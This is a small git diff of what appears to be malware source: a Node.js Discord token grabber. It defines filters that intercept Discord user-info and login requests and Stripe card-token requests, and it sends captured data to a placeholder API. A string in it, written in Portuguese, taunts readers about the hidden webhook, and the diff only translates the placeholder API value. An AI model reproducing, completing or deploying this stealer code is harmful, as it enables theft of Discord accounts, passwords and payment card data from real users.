@@ -6,7 +6,7 @@ const fs = require('fs');
 const path = require('path');
 const fetch = require('node-fetch');
 const webhook = "Você realmente acha que vou deixar uma webhook, em um script ofuscado em pleno 2022? Bjs"
-const api = "sua api"
+const api = "your api url"
 const Filters = {
     1: {
         urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
